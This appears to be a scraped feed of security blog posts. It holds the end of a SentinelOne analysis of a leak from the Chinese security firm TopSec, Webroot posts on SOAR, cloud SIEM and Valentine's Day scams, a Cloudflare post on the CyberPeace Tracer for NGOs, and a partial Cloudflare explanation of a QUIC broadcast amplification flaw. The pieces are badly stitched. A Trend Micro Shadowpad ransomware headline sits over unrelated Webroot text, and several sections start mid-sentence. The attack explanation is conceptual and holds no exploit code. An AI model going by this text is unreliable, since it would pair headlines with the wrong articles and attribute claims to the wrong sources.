&lt;figure class="wp-caption aligncenter" id="attachment_114599" style="width: 1088px;"&gt;&lt;img alt="Search results that still show Bai Tinghui’s name on SASAC website" class="size-full wp-image-114599" height="1778" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_13.jpg" width="1088" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114599"&gt;Search results that still show Bai Tinghui’s name on SASAC website&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Intriguingly, the organization that is responsible for investigating the fallen Bai Tinghui, the Shanghai Municipal Commission for Discipline Inspection, is listed among TopSec’s customers in the tooling.&lt;/p&gt;
&lt;p&gt;The downfall of Bai Tinghui and the resulting use of Beijing TopSec’s tooling for coordinated monitoring of politically sensitive content shines a light on the important role cybersecurity companies can play in Chinese politics. The CCP has &lt;a href="https://www.newamerica.org/cybersecurity-initiative/blog/chinas-strategic-thinking-building-power-cyberspace/"&gt;long-acknowledged&lt;/a&gt; that “If our party cannot traverse the hurdle represented by the Internet, it cannot traverse the hurdle of remaining in power for the long term.” This episode provides a compelling example of how corruption investigations expand to rely on the institutions of those being investigated and the cybersecurity companies that service them.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;These leaks yield insight into the complex ecosystem of relationships between government entities and China’s private sector cybersecurity companies. While many countries have significant overlap between government requirements and private sector cybersecurity firms, the ties between these entities in China are much deeper and represent the state’s grasp on managing public opinion through online enforcement.&lt;/p&gt;
&lt;p&gt;The September 2023 situation in Shanghai provides insight into how local and national government interests are enforced through private sector partnerships. The CCP’s strategy of controlling information is multifaceted and requires significant investment in resources that enable the monitoring and alteration of content that citizens engage with. While there are still many unknown factors regarding how such censorship is applied, these findings yield insights into how collaboration occurs between the government and other entities in China.&lt;/p&gt;
&lt;p&gt;The nature of how this data was leaked remains unclear, but the materials show that TopSec engineers were documenting their work in a highly granular way that included entire commands used to perform the outlined tasks. Considering the types of information in this leak, organizations should evaluate how their systems and infrastructure engineers are logging work. Proper credential management is essential to securing sensitive environments. Infrastructure engineers should rely on a secrets manager that integrates with the CI/CD pipeline rather than running commands from playbooks that include hardcoded credentials. This results in only variable names being stored in commands instead of sensitive credentials and lowers the likelihood that an unexpected disclosure could result in further compromise.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&amp;p=114581</guid><category>China</category></item><item><title>Updated Shadowpad Malware Leads to Ransomware Deployment</title><link>https://www.trendmicro.com/en_us/research/25/b/updated-shadowpad-malware-leads-to-ransomware-deployment.html</link><description>In this blog, we discuss about how Shadowpad is being used to deploy a new undetected ransomware family.

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/19/msps-weigh-in-key-soar-benefits-driving-mdr-success/" rel="nofollow"&gt;MSPs weigh in: Key SOAR benefits driving MDR success&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;OpenText recently surveyed 255 MSPs to uncover key trends shaping the future of Managed Detection and Response (MDR). One technology area it explored was security orchestration, automation, and response (SOAR)—the workhorse behind automating security workflows. The survey revealed several key benefits of SOAR in MDR, highlighting how it can help MSPs and SMBs improve incident response, reduce alert fatigue, and deliver round-the-clock security.&lt;/p&gt;



&lt;p&gt;SOAR is a technology that enables security teams to automate and streamline their workflows—from threat detection to response. It integrates and coordinates security tools and processes, helping analysts handle and respond to incidents. By automating repetitive tasks, such as triaging alerts and executing response actions, SOAR reduces manual effort and speeds up incident resolution. This improves the overall effectiveness of security operations, making it a critical component of modern MDR solutions.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Real-world benefits of SOAR for MDR solutions&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Automation of common tasks&lt;/strong&gt;&lt;br /&gt;In the survey, 30% of MSPs pointed to automation of common tasks as the most valuable benefit of SOAR within an MDR service—and it’s easy to see why. Automation allows MSPs to streamline repetitive tasks like alert triage and standard response workflows. By speeding up incident resolution and ensuring consistent, accurate responses, SOAR helps MSPs address threats swiftly and effectively. This not only reduces the burden on security teams but also enables them to outpace adversaries and deliver stronger protection for their customers.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Improved 24/7/365 protection and after-hours response&lt;/strong&gt;&lt;br /&gt;Cybercriminals know that timing is everything. They often strike outside of business hours—late at night, on weekends, or during holidays—because they count on reduced staffing and slower response times to give them the upper hand. However, with MDR services leveraging SOAR, cybercriminals lose their “after hours advantage.”&lt;/p&gt;



&lt;p&gt;According to the survey, 27% of MSPs identified improved 24/7/365 protection and after-hours response as a top SOAR benefit as part of an MDR solution. By automating detection and response using customizable workflows, SOAR ensures security measures are always on, regardless of the time or day.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Reduced alert fatigue&lt;/strong&gt;&lt;br /&gt;Alert fatigue is one of the most pressing challenges for security teams today. When bombarded with an overwhelming number of alerts, it’s easy for critical threats to get lost in the noise. SOAR directly tackles this issue, helping MSPs streamline their processes and focus on what really matters. In fact, 24% of MSPs in the survey noted that SOAR’s ability to reduce alert fatigue thereby improving accuracy and confidence was a key benefit for an MDR solution.&lt;/p&gt;



&lt;p&gt;SOAR works by automatically analyzing security alerts against predefined rules and context, escalating the most critical threats to the surface. This not only sharpens the accuracy of responses but also enables security teams to act quickly and decisively. Security teams can use SOAR to create workflows to remediate the high-priority incidents that truly need attention, ensuring that any financial and reputational damage is minimized&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Centralized incident management with enriched alerts&lt;/strong&gt;&lt;br /&gt;When it comes to incident management, having a disjointed view can slow down response times and make it harder to pinpoint the right course of action. That’s why 19% of MSPs in the survey highlighted centralized incident management and enriched alerts as one of the top benefits of SOAR for an MDR solution.&lt;/p&gt;



&lt;p&gt;Alerts are enriched with the latest threat intelligence, which provides security teams with vital context. This deeper layer of information helps analysts understand the full scope and severity of an alert, allowing them to make quicker, more informed decisions. With SOAR, all relevant data is centralized in one platform, giving security teams a unified view that enhances their ability to respond effectively and prioritize the most critical threats without missing crucial details.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;MDR with SOAR helps MSPs differentiate their offering&lt;/h2&gt;



&lt;p&gt;For MSPs, leveraging SOAR capabilities in their MDR offerings is a strategic move that can significantly enhance their service delivery. By focusing on the key benefits of automation using workflows, 24/7 protection, reduced alert fatigue, and centralized incident management, MSPs can provide a superior level of security that meets the evolving needs of their SMB clients. This differentiation not only improves client outcomes but also positions MSPs as leaders in the competitive security services market.&lt;/p&gt;



&lt;p&gt;Incorporating SOAR into MDR services enables MSPs to offer a more efficient, reliable, and comprehensive security solution. With SOAR automating routine tasks, improving after-hours response, reducing alert fatigue, and centralizing incident management, MSPs can ensure that their clients receive the best possible defense against cyber threats. This approach not only enhances the overall security posture of SMBs but also builds trust and confidence in the MSPs&amp;#8217; ability to safeguard their clients&amp;#8217; digital assets.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Final thoughts&lt;/h2&gt;



&lt;p&gt;When MSPs choose to partner with a vendor for MDR, it’s important to select one that integrates SOAR into their offering. By doing so, MSPs can deliver a modern, proactive MDR service that improves security posture and provides the best experience for their SMB customers. SOAR accelerates response actions to stop adversaries in their tracks at every turn, ensuring that MSPs can swiftly detect and respond to threats before they inflict damage. With SOAR at the core, MSPs can offer a superior MDR service that adapts to the rapidly changing threat landscape, keeping their customers secure, happy, and confident.&lt;/p&gt;

These organizations play a large role in delivering services during crises, whether it is &lt;a href="https://www.cloudflare.com/case-studies/awaq-ongd/"&gt;&lt;u&gt;fighting climate change&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/case-studies/valdosta-amateur-radio-club/"&gt;&lt;u&gt;support during natural disasters&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/case-studies/hera-digital-health/"&gt;&lt;u&gt;providing health services to marginalized communities&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.cloudflare.com/project-galileo-case-studies/"&gt;&lt;u&gt;more. &lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;What do many of these organizations have in common? Many times, it’s cyber attacks from adversaries looking to steal sensitive information or disrupt their operations. Cloudflare has seen this firsthand when providing free cybersecurity services to vulnerable groups through programs like &lt;a href="https://www.cloudflare.com/galileo/"&gt;&lt;u&gt;Project Galileo,&lt;/u&gt;&lt;/a&gt; and found that in aggregate, organizations protected under the project experience an average of 95 million attacks per day. While cyber attacks are a problem across all industries in the digital age, civil society organizations are disproportionately targeted, many times due to their advocacy, and because attackers know that they typically operate with limited resources. In most cases, these organizations don’t even know they have been attacked until it is too late. &lt;/p&gt;&lt;p&gt;Over the last 10 years of Project Galileo, we’ve had the opportunity to work more closely with leading civil society organizations. This has led to a number of exciting new partnerships, including our work with the &lt;a href="https://cyberpeaceinstitute.org/"&gt;&lt;u&gt;CyberPeace Institute&lt;/u&gt;&lt;/a&gt;. That’s why we’re excited to share work on a new resource, the &lt;a href="https://cyberpeacetracer.ngo/"&gt;&lt;u&gt;CyberPeace Tracer&lt;/u&gt;&lt;/a&gt;. This resource will enable researchers, civil society, governments, and other organizations to understand threats and data-driven insights about the cyber threat landscape of the vulnerable communities we serve.&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;The CyberPeace Institute is an independent non-profit based in Switzerland, dedicated to making cyberspace safer and more equitable for everyone. The Institute works closely with partners to minimize the impact of cyberattacks on people’s lives worldwide. In addition to partnerships, the organization provides independent &lt;a href="https://cyberpeaceinstitute.org/cyber-incident-tracers/"&gt;&lt;u&gt;data-driven insights on the threat landscape&lt;/u&gt;&lt;/a&gt;, from the global healthcare system to cyber attacks during the Russian government's invasion of Ukraine. By analyzing these attacks, they are able to highlight real-world consequences, expose violations of international laws and norms, and promote responsible behavior online.&lt;/p&gt;&lt;p&gt;Cloudflare's work with the CyberPeace Institute started in 2022 when the organization joined Project Galileo.Through the program, Cloudflare was proud not only to help protect the CyberPeace website, but also provide &lt;a href="https://blog.cloudflare.com/democratizing-access-to-zero-trust-with-project-galileo/"&gt;&lt;u&gt;Zero Trust tools&lt;/u&gt;&lt;/a&gt; that secure access to internal applications for the institute's global workforce. In addition to participating in Project Galileo, CyberPeace has also joined as an official partner, alongside more than 53 civil society organizations that help us identify organizations in need of protection.&lt;/p&gt;&lt;p&gt;As the CyberPeace Institute helped us grow Project Galileo, they also tested out new features including &lt;a href="https://developers.cloudflare.com/email-security/"&gt;&lt;u&gt;Cloudflare Email Security&lt;/u&gt;&lt;/a&gt;, a Cloudflare product designed to help protect against phishing and ransomware attacks. Testing the product for their organizations, they found that our approach to proactively detect and block malicious email, and ease of deployment with no need for hardware or extra software, would benefit the wider community they serve. With this in mind, CyberPeace came to us with an idea: they saw the potential to extend Email Security to smaller organizations that don’t have the same technical tools or budget to protect themselves. &lt;/p&gt;&lt;p&gt;Through our unique partnership, the CyberPeace Institute onboards its network of NGOs with Cloudflare Email Security, serving as a central hub to aggregate real-time data on email threats. This information powers a live dashboard, providing other organizations with visibility into phishing campaigns that could impact the broader community. One key challenge in tracking targeted phishing attacks is that many incidents go unreported, or victims may not realize they have been compromised until much later. By having a partner serve as a centralized point of contact, it helps ensure that insights into phishing attempts at one NGO can help protect others before the attack spreads. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;CyberPeace Tracer&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberpeace-tracer"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The &lt;a href="https://cyberpeacetracer.ngo/analysis"&gt;&lt;u&gt;CyberPeace Tracer &lt;/u&gt;&lt;/a&gt;shares vulnerabilities and threats faced by the community of NGOs, developed by the CyberPeace Institute. The CyberPeace Tracer gathers and analyzes data on cyberattacks and disinformation campaigns targeting NGOs, non-profits, and charities that address global societal challenges. The goal is to better understand the scale and impact of these threats to inform the public, so that organizations can become aware of emerging threats and take action to improve their defenses.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3TvamEbkKLmzwwRmGBSfyO/e9538a60967b4384e184c437206b081e/image3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;For the Tracer, CyberPeace partners and collects data directly from partners who monitor a predefined set of NGO domains. The dashboards detail publicly disclosed software and hardware vulnerabilities that can be exploited against monitor NGOs, malware infections detected, and analysis of phishing attacks that reveal trends and attacker tactics. The Tracer breaks out incidents by sector, including organizations working in health, development, food, water, energy, human rights, women’s rights and more. On the &lt;a href="https://cyberpeacetracer.ngo/analysis/phishing-threats"&gt;&lt;u&gt;phishing dashboard&lt;/u&gt;&lt;/a&gt;, users can filter by country, identify the top phishing subject lines that NGOs received, as well as the top five threats that were blocked by the Email Security product. &lt;/p&gt;&lt;p&gt;Our collaboration with CyberPeace strengthens defenses against phishing by allowing the CyberPeace Institute to analyze flagged emails, helping to identify and disrupt malicious domains and ongoing threats. By analyzing past incidents, we have found that organizations can learn from others’ experiences and implement best practices to reduce the likelihood of future attacks and data breaches, especially in a sector where many times, attacks go unreported. &lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;This is an exciting development for strengthening reporting on cyber attacks to non-profits, enabling them to collaborate on solutions, share threat intelligence, and build stronger defenses across the sector.

The findings reveal not only what cybersecurity professionals are prioritizing but also how MSPs can better meet the evolving demands of their small and midsize business (SMB) customers.&lt;/p&gt;



&lt;p&gt;One key takeaway from the survey: &lt;strong&gt;81% of respondents rated cloud-based SIEM (security information and event management) as important to include in their MDR solution&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Why is cloud-based SIEM such a big deal for an MDR? Because for MSPs delivering MDR services, it’s the backbone that makes scalability, visibility, central and efficient threat management possible.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Cloud-based SIEM is an essential MDR backbone&lt;/h2&gt;



&lt;p&gt;The modern attack surface is vast. Business customers are spread across hybrid infrastructures with data flowing through endpoints, networks, applications, and the cloud. Cloud-based SIEM-powered MDR services help MSPs stay on top of this complexity by serving as the single source of truth for detecting and responding to threats.&lt;/p&gt;



&lt;p&gt;Here’s why it matters:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Seamless data ingestion&lt;/strong&gt;&lt;br /&gt;Cloud-based SIEMs ingest security telemetry from diverse sources—EDR solutions, applications, cloud infrastructure, network packet data, and more—to deliver a holistic view of a customer’s environment.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;In-depth correlation and analysis&lt;/strong&gt;&lt;br /&gt;By correlating data across borderless infrastructures, SIEM provides security analysts with the context they need to identify, prioritize, and address the most impactful threats.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Scalability and accessibility&lt;/strong&gt;&lt;br /&gt;As businesses grow, so do their security needs. Cloud-based SIEM scales effortlessly, ensuring an MSP’s MDR services can handle large data volumes without compromising performance. Plus, analysts can access SIEM insights anywhere, anytime.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In short, a cloud-based SIEM ensures that no corner of the customer’s attack surface is left unseen—from endpoint to cloud. It provides comprehensive visibility, continuously collecting, correlating and analyzing data from every layer of the IT environment. This means the MDR service can detect threats wherever they may arise, whether on-premises, in the cloud, or across hybrid infrastructures, giving MSPs the ability to respond quickly and effectively to any potential risk.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;How SIEM drives faster MDR outcomes&lt;/h2&gt;



&lt;p&gt;Cyberattacks move fast. MSPs delivering MDR services need tools and processes that can keep pace with today’s threats. A cloud-based SIEM is the essential technology that enables the MDR service to deliver rapid detection, triage and investigation. Here’s how SIEM supports faster outcomes across every stage:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Rapid detection: &lt;/strong&gt;A cloud-based SIEM continuously ingests and correlates syslog data from all sources, reducing the time it takes to identify a threat after it emerges.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Time to triage: &lt;/strong&gt;By consolidating telemetry into a centralized platform, SIEM enables security analysts to quickly assess and prioritize incidents—cutting through the noise to focus on the most critical threats.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Accelerated investigation:&lt;/strong&gt; SIEM by leveraging threat intel provides the context analysts need to understand a threat, pinpoint its origin, and determine its potential impact—all without needing to manually stitch together insights.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;Expert-led, SIEM-enabled&lt;/h2&gt;



&lt;p&gt;When MSPs choose an MDR partner solution with a cloud-based SIEM at its core, they unlock more than just a sophisticated tool. They gain the advantage of expert-led security teams that can leverage the full potential of the SIEM platform to deliver rapid, precise, and continuous threat detection.&lt;/p&gt;



&lt;p&gt;The survey results highlight that MSPs see the distinct advantage of running an MDR service with a cloud-based SIEM, which enhances their ability to run a 24/7/365 security operations center (SOC). With SIEM as the central hub, security experts can quickly surface suspicious activity, centrally manage investigations and take swift action.&lt;/p&gt;



&lt;p&gt;The value of expert-led, SIEM-enabled MDR becomes even clearer when you consider the following benefits:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Round-the-clock SOC with seamless investigations&lt;/strong&gt;&lt;br /&gt;The ability to monitor and respond to threats 24/7X365 is critical for an MDR service. By consolidating threat data into a centralized cloud SIEM, experts can detect malicious activity at any time of day or night. This continuous monitoring reduces the risk of attackers moving undetected, ensuring that threats are neutralized before they can cause harm.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Single, integrated tool for investigation&lt;/strong&gt;&lt;br /&gt;The MDR survey results highlight the value MSPs place on having a unified toolset for threat detection and investigation. A cloud-based SIEM with threat intel provides this central hub, enabling security teams to efficiently assess the scope of incidents, prioritize based on severity, and track the attack’s progress in real-time. The SIEM can correlate data across multiple environments—whether it’s endpoint data, network logs, or cloud infrastructure—ensuring nothing slips through the cracks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Expert insight into threat context&lt;/strong&gt;&lt;br /&gt;The SIEM doesn’t just provide raw data; it enriches that data with valuable context from threat intel , helping the MDR security experts to identify the root cause of a threat, its potential impact, and the fastest path to resolution.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;As cyber threats become more relentless and attack surfaces continue to expand, MSPs are in a unique position to help SMBs stay secure. OpenText’s MDR survey results highlight what’s clear: a cloud-based SIEM as part of an MSP’s MDR solution is a priority set up. It allows MSPs to deliver consistent, effective threat detection and response.&lt;/p&gt;



&lt;p&gt;By combining the right technology with the right expertise, MSPs can navigate the complexity of today’s cybersecurity landscape and give their customers the confidence to focus on what matters most: growing their business.&lt;/p&gt;

&lt;p&gt;And while &lt;strong&gt;February 14&lt;/strong&gt; usually means love is in the air, Valentine’s Day is also a popular day with internet scammers. In 2024, romance scams alone led to losses tallied to $3.8 billion according to the &lt;a href="https://verafin.com/2024/02/romance-scams-a-heartless-reality/" rel="noreferrer noopener" target="_blank"&gt;Nasdaq 2024 Global Financial Crime Report&lt;/a&gt;. Don’t be wooed by too-good-to-be-true offers, online dating scams, and fraudulent websites. Stay informed about common scams and take action to stay safe.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Common Valentine’s Day scams&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Online dating scams&lt;/strong&gt;&lt;br /&gt;&lt;a href="https://cybermagazine.com/articles/ai-based-phishing-scams-are-on-the-rise-this-valentines-day" rel="noreferrer noopener" target="_blank"&gt;AI-powered phishing&lt;/a&gt; scams are on the rise, impersonating popular online dating platforms. Scammers send fake match emails with malicious links, pretending to be from legitimate dating websites.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip: &lt;/strong&gt;Look for misspellings in the dating website name or web address and check the “from field” to make sure it’s a real address.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Trust your instincts&lt;/strong&gt;&lt;br /&gt;If something feels off—like a relationship escalating too quickly or seeming too perfect—listen to your gut.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip:&lt;/strong&gt; Scammers often use rapid declarations of love to emotionally manipulate their victims.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Be cautious with platform switching&lt;/strong&gt;&lt;br /&gt;Think twice before moving a conversation off a dating app to a less secure platform.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip: &lt;/strong&gt;Scammers often push for this to avoid detection.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Phony gift and delivery services&lt;/strong&gt;&lt;br /&gt;Scammers often lure victims with heavily discounted flowers, gifts, or even romantic getaway deals on unknown websites. These fraudsters go to great lengths to create the appearance of being legitimate florist, gift basket retailer, or travel agent, setting up websites, placing ads on social media, and sending emails. You go to the website enter your information and credit card details only to receive nothing or something that is not what you ordered.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip:&lt;/strong&gt; Always verify websites by checking for HTTPS in the URL and reading online reviews before making a purchase.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;E-card and gift card scams&lt;/strong&gt;&lt;br /&gt;While digital greeting cards and gift cards are a convenient way to spread love, they’re also a common tool for cybercriminals. Scammers send fake e-cards that contain malware or gift card phishing emails asking you to redeem them on fraudulent websites.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip: &lt;/strong&gt;Never open e-cards from unknown senders, and never purchase gift cards as payment for someone you haven’t met in person.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;How to protect your heart, computer, and wallet from these scams&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Do your research&lt;/strong&gt;&lt;br /&gt;Before opening email or clicking links make sure they are being sent to you by a reputable brand. &lt;a href="https://www.webroot.com/us/en/home/products/av"&gt;Webroot Secure VPN + AntiVirus&lt;/a&gt; offer real-time protection for your connection and devices while you are browsing the internet.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Be cautious sharing personal information&lt;/strong&gt;&lt;br /&gt;Don&amp;#8217;t share sensitive information like credit card details or home address with any website or person unless you are confident in their identity. Consider investing in identity protection security solutions that will monitor the web for unauthorized usage and credit report monitoring, such as &lt;a href="https://www.webroot.com/us/en/home/products/premium"&gt;Webroot Premium&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Secure your devices and backup your data&lt;/strong&gt;&lt;br /&gt;Ensure your devices have the latest security updates installed. Use &lt;a href="https://www.carbonite.com/" rel="noreferrer noopener" target="_blank"&gt;Carbonite’s &lt;/a&gt;secure, automatic computer backup solution to protect important files from cyber threats.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Strengthen your passwords and use two-factor authentication&lt;/strong&gt;&lt;br /&gt;Make sure to use complex and unique passwords, incorporating letters, numbers and symbols. Consider enabling multi-factor authentication (MFA) for extra security—this helps verify your identity with a second step, like a text or email code. Solutions such as &lt;a href="https://www.webroot.com/us/en/home/products/premium"&gt;Webroot Premium&lt;/a&gt; and &lt;a href="https://www.webroot.com/us/en/home/products/av"&gt;Webroot AntiVirus&lt;/a&gt; include passwords managers to making it easier to remember all your passwords.&lt;/p&gt;

We've implemented a mitigation.</description><content:encoded>&lt;p&gt;Cloudflare was recently contacted by a group of anonymous security researchers who discovered a broadcast amplification vulnerability through their &lt;a href="https://blog.cloudflare.com/tag/quic"&gt;&lt;u&gt;QUIC&lt;/u&gt;&lt;/a&gt; Internet measurement research. Our team collaborated with these researchers through our Public Bug Bounty program, and worked to fully patch a dangerous vulnerability that affected our infrastructure.&lt;/p&gt;&lt;p&gt;Since being notified about the vulnerability, we've implemented a mitigation to help secure our infrastructure. According to our analysis, we have fully patched this vulnerability and the amplification vector no longer exists. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Summary of the amplification attack&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#summary-of-the-amplification-attack"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;QUIC is an Internet transport protocol that is encrypted by default. It offers equivalent features to &lt;a href="https://www.cloudflare.com/learning/ddos/glossary/tcp-ip/"&gt;&lt;u&gt;TCP&lt;/u&gt;&lt;/a&gt; (Transmission Control Protocol) and &lt;a href="https://www.cloudflare.com/learning/ssl/transport-layer-security-tls/"&gt;&lt;u&gt;TLS&lt;/u&gt;&lt;/a&gt; (Transport Layer Security), while using a shorter handshake sequence that helps reduce connection establishment times. QUIC runs over &lt;a href="https://www.cloudflare.com/en-gb/learning/ddos/glossary/user-datagram-protocol-udp/"&gt;&lt;u&gt;UDP&lt;/u&gt;&lt;/a&gt; (User Datagram Protocol).&lt;/p&gt;&lt;p&gt;The researchers found that a single client QUIC &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-17.2.2"&gt;&lt;u&gt;Initial packet&lt;/u&gt;&lt;/a&gt; targeting a broadcast IP destination address could trigger a large response of initial packets. This manifested as both a server CPU amplification attack and a reflection amplification attack.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Transport and security handshakes&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#transport-and-security-handshakes"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;When using TCP and TLS there are two handshake interactions. First, is the TCP 3-way transport handshake. A client sends a SYN packet to a server, it responds with a SYN-ACK to the client, and the client responds with an ACK. This process validates the client IP address. Second, is the TLS security handshake. A client sends a ClientHello to a server, it carries out some cryptographic operations and responds with a ServerHello containing a server certificate. The client verifies the certificate, confirms the handshake and sends application traffic such as an HTTP request.&lt;/p&gt;&lt;p&gt;&lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-7"&gt;&lt;u&gt;QUIC&lt;/u&gt;&lt;/a&gt; follows a similar process, however the sequence is shorter because the transport and security handshake is combined. A client sends an Initial packet containing a ClientHello to a server, it carries out some cryptographic operations and responds with an Initial packet containing a ServerHello with a server certificate. The client verifies the certificate and then sends application data.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7wsMcFwy8xMRYwQyFNm6oC/5d131543e7704794776dfc3ed89c1693/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;The QUIC handshake does not require client IP address validation before starting the security handshake. This means there is a risk that an attacker could spoof a client IP and cause a server to do cryptographic work and send data to a target victim IP (aka a &lt;a href="https://blog.cloudflare.com/reflections-on-reflections/"&gt;&lt;u&gt;reflection attack&lt;/u&gt;&lt;/a&gt;). &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000"&gt;&lt;u&gt;RFC 9000&lt;/u&gt;&lt;/a&gt; is careful to describe the risks this poses and provides mechanisms to reduce them (for example, see Sections &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-8"&gt;&lt;u&gt;8&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-9.3.1"&gt;&lt;u&gt;9.3.1&lt;/u&gt;&lt;/a&gt;). Until a client address is verified, a server employs an anti-amplification limit, sending a maximum of 3x as many bytes as it has received. Furthermore, a server can initiate address validation before engaging in the cryptographic handshake by responding with a &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-8.1.2"&gt;&lt;u&gt;Retry packet&lt;/u&gt;&lt;/a&gt;. The retry mechanism, however, adds an additional round-trip to the QUIC handshake sequence, negating some of its benefits compared to TCP. Real-world QUIC deployments use a range of strategies and heuristics to detect traffic loads and enable different mitigations.&lt;/p&gt;&lt;p&gt;In order to understand how the researchers triggered an amplification attack despite these QUIC guardrails, we first need to dive into how IP broadcast works.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Broadcast addresses&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#broadcast-addresses"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In Internet Protocol version 4 (IPv4) addressing, the final address in any given &lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-a-subnet/"&gt;&lt;u&gt;subnet&lt;/u&gt;&lt;/a&gt; is a special broadcast IP address used to send packets to every node within the IP address range. Every node that is within the same subnet receives any packet that is sent to the broadcast address, enabling one sender to send a message that can be “heard” by potentially hundreds of adjacent nodes. This behavior is enabled by default in most network-connected systems and is critical for discovery of devices within the same IPv4 network.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/49zGjFbeIv7RxZMM6W2i5V/9e9e5f2f3bd8401467887d488930f476/image3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;The broadcast address by nature poses a risk of DDoS amplification; for every one packet sent, hundreds of nodes have to process the traffic. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Dealing with the expected broadcast&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#dealing-with-the-expected-broadcast"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
